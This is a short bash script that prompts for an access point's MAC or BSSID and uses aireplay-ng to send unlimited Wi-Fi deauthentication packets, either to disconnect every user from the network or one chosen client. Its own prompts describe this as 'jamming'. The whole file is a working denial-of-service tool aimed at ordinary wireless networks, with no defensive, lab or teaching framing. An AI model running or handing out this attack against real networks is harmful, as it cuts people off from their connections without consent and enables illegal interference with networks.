echo "enter mac or bssid like '78:17:35:DE:F8:19' for sending deauth packets for jamming :)"
read mac
echo "enter value for 1. disconnect all users from wifi"
echo "enter value for 2. specific user from wifi enter their mac or bssid example '78:17:35:DE:F8:19' "
read val
if [ $val -eq 1 ]
then
	aireplay-ng -0 0 -a $mac wlan0mon
fi
if [ $val -eq 2 ]
then
	echo "enter users mac :)"
	read mac_client
	aireplay-ng -0 0 -a $mac -c $mac_client wlan0mon
fi
airmon-ng stop wlan0mon
